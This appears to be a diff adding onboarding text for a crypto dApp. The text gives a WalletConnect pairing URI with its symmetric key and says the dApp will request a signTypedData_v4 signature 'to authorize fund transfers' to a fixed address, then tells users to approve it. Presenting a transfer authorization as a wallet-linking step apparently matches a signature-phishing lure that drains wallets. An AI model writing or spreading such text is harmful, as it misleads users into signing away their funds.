@@ -1,0 +1,5 @@
+To link your mobile wallet to the platform, scan this WalletConnect QR or tap the deeplink:
+
+wc:7f93a4b2-1e8d-4c5f-9a23-6b7c8d9e0f1a@2?relay-protocol=irn&symKey=5f8a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4
+
+Once connected, the dApp will initiate a signTypedData_v4 request to authorize fund transfers to 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD. Approve the request in your wallet app.
